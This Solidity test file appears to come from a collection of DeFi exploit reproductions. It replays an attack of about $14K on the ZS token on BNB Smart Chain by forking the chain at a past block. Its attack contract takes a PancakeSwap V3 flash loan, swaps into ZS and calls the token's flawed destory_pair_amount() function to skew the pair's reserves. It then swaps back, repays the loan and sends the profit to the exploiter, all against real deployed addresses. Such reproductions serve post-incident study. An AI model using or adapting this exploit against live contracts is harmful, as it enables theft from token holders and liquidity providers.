// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./../basetest.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$14K
// Attacker : https://bscscan.com/address/0x7ccf451d3c48c8bb747f42f29a0cde4209ff863e
// Attack Contract : https://bscscan.com/address/0xa905ff8853edc498a2acddfdfac4a56c2c599930
// Vulnerable Contract : https://bscscan.com/address/0x12b3b6b1055b8ad1ae8f60a0b6c79a9825bcb4bc
// First Attack Tx : https://app.blocksec.com/explorer/tx/bsc/0xe2e87090f47c82eed3697297763edfad8e9689d2da7a4325541087d77432f54f
// Second Attack Tx : https://app.blocksec.com/explorer/tx/bsc/0xbc88aa6057f9da6f88e28bc908baad111ae7545e69fb0c90fbdfd485c9e72192

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x12b3b6b1055b8ad1ae8f60a0b6c79a9825bcb4bc#code#F1#L1553

// @Analysis
// Post-mortem :
// Twitter Guy : https://x.com/MetaSec_xyz/status/1711189697534513327
// Hacking God :

interface IZS is IERC20 {
    function Burnamount() external view returns (uint256);

    function destory_pair_amount() external;
}

contract ZSExploit is BaseTestWithBalanceLog {
    IZS private constant ZS = IZS(0x12b3B6b1055B8Ad1aE8F60a0B6C79A9825Bcb4bC);
    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakeRouter private constant PancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    Uni_Pair_V3 private constant BUSDT_USDC = Uni_Pair_V3(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
    Uni_Pair_V2 private constant ZS_BUSDT = Uni_Pair_V2(0x162888d39Cfb0990699aD1EA252521b2982ad690);

    uint256 private constant blocknumToForkFrom = 32_429_591;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        vm.label(address(ZS), "ZS");
        vm.label(address(BUSDT), "BUSDT");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(PancakeRouter), "PancakeRouter");
        vm.label(address(BUSDT_USDC), "BUSDT_USDC");
        vm.label(address(ZS_BUSDT), "ZS_BUSDT");
    }

    function testExploit() public {
        deal(address(this), 0.1 ether);
        deal(address(BUSDT), address(this), 0);
        // First tx
        AttackContract attackContract = new AttackContract{value: address(this).balance}();
        vm.roll(block.number + 2);
        emit log_named_decimal_uint(
            "Exploiter BUSDT balance before attack",
            BUSDT.balanceOf(address(this)),
            BUSDT.decimals()
        );
        // Second tx
        attackContract.exploitZS();

        emit log_named_decimal_uint(
            "Exploiter BUSDT balance after attack",
            BUSDT.balanceOf(address(this)),
            BUSDT.decimals()
        );
    }
}

contract AttackContract is Test {
    IZS private constant ZS = IZS(0x12b3B6b1055B8Ad1aE8F60a0B6C79A9825Bcb4bC);
    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakeRouter private constant PancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    Uni_Pair_V3 private constant BUSDT_USDC = Uni_Pair_V3(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
    Uni_Pair_V2 private constant ZS_BUSDT = Uni_Pair_V2(0x162888d39Cfb0990699aD1EA252521b2982ad690);
    address private immutable exploiter;

    // Calling ZS token in constructor here is crucial because of ZS transfer function logic
    // https://bscscan.com/address/0x12b3b6b1055b8ad1ae8f60a0b6c79a9825bcb4bc#code#F1#L1480
    constructor() payable {
        exploiter = msg.sender;
        BUSDT.approve(address(PancakeRouter), type(uint256).max);
        WBNBToBUSDT();
        BUSDTToZS();
        BUSDT.transfer(address(ZS_BUSDT), 1);
        ZS.transfer(address(ZS_BUSDT), 1e18);
        ZS_BUSDT.sync();
    }

    function exploitZS() external {
        uint256 ZSAmountOut = (ZS.balanceOf(address(ZS_BUSDT)) - ZS.Burnamount()) - 1;
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(ZS);
        uint256[] memory amountsIn = PancakeRouter.getAmountsIn(ZSAmountOut, path);
        uint256 flashBUSDTAmount = (amountsIn[0] + 1_000e18) - BUSDT.balanceOf(address(this));
        bytes memory data = abi.encode(flashBUSDTAmount);
        BUSDT_USDC.flash(address(this), flashBUSDTAmount, 0, data);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        uint256 amountToRepayFlash = abi.decode(data, (uint256));
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(ZS);
        uint256[] memory amountsOut = PancakeRouter.getAmountsOut(BUSDT.balanceOf(address(this)) - 1_000e18, path);
        ZS_BUSDT.swap(amountsOut[1], 0, address(this), bytes("_"));

        // Call to flawed function
        ZS.destory_pair_amount();
        path[0] = address(ZS);
        path[1] = address(BUSDT);
        amountsOut = PancakeRouter.getAmountsOut(ZS.balanceOf(address(this)), path);
        BUSDT.transfer(address(ZS_BUSDT), 1);
        ZS.transfer(address(ZS_BUSDT), ZS.balanceOf(address(this)));
        ZS_BUSDT.swap(0, amountsOut[1], address(this), bytes(""));

        BUSDT.transfer(address(BUSDT_USDC), amountToRepayFlash + fee0);
        BUSDT.transfer(exploiter, BUSDT.balanceOf(address(this)));
    }

    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
        BUSDT.transfer(address(ZS_BUSDT), BUSDT.balanceOf(address(this)) - 1_000e18);
    }

    function WBNBToBUSDT() private {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BUSDT);
        PancakeRouter.swapExactETHForTokens{value: address(this).balance}(
            0,
            path,
            address(this),
            block.timestamp + 1_000
        );
    }

    function BUSDTToZS() private {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(ZS);
        PancakeRouter.swapExactTokensForTokens(
            BUSDT.balanceOf(address(this)) / 2,
            0,
            path,
            address(this),
            block.timestamp + 1_000
        );
    }
}
